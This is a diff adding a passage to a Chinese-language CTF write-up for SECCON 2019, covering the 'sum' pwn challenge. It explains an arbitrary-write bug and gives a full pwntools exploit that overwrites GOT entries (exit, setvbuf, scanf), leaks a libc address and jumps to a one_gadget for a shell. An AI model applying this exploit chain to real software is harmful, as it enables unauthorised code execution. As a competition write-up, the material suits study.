@@ -498,13 +498,74 @@ $ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG
 SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
 ```
 
+## sum
 
+程序功能是输入5个数求和
+
+![6](https://raw.githubusercontent.com/AiDaiP/images/master/seccon2019/6.jpg)
+
+![5](https://raw.githubusercontent.com/AiDaiP/images/master/seccon2019/5.jpg)
+
+
+
+![7](https://raw.githubusercontent.com/AiDaiP/images/master/seccon2019/7.jpg)
+
+![8](https://raw.githubusercontent.com/AiDaiP/images/master/seccon2019/8.jpg)
+
+实际上可以输入6个数，且第6个数覆盖v9
+
+6个数之和写入v9，这样就可以任意地址写
+
+`'-1  -1 2 -{} {} {}'.format(addr, value, addr)`
+
+输入6个数在sum执行完之后会进exit，所以首先应该把exit_got写为start，实现重复利用
+
+Rwind给出一种爆破的方法，由running跑出
+
+running tql
+
+在ctftime看了一波wp后学了一种巧妙的方法
+
+https://syedfarazabrar.com/2019-10-20-secconctf-2019-sum/
+
+利用`setvbuf(_bss_start, 0LL, 2, 0LL)`泄露地址
+
+![9](https://raw.githubusercontent.com/AiDaiP/images/master/seccon2019/9.jpg)
+
+把setvbuf_got写为puts_plt
+
+把bss_start写为要泄露的目标
+
+执行`setvbuf(_bss_start, 0LL, 2, 0LL)`，就可以泄露地址
+
+```python
+from pwn import *
+r = process('./sum')
+#r = remote('sum.chal.seccon.jp', 10001)
+
+elf = ELF('./sum')
+libc = ELF('./libc.so')
+
+
+def write64(addr, value):
+    r.sendlineafter('2 3 4 0\n', '-1  -1 2 -{} {} {}'.format(addr, value, addr))
+
+write64(elf.got['exit'], elf.symbols['_start'])
+write64(elf.got['setvbuf'], elf.plt['puts'])
+write64(elf.symbols['__bss_start'], elf.got['puts'])
+
+libc_base = u64(r.recv(6).ljust(8, '\x00')) - libc.symbols['puts']
+log.success('libc:'+hex(libc_base))
+
+write64(elf.got['__isoc99_scanf'], libc_base + 0x4f322)
+r.interactive()
+```
 
 
 
 ## Option-Cmd-U
 
-```
+```php
                     <?php
                     if (isset($_GET['url'])){
                         $url = filter_input(INPUT_GET, 'url');
@@ -613,4 +674,6 @@ def fuck(str)
 	return int("1" * 10000)%i
 
 ```
+
+
 
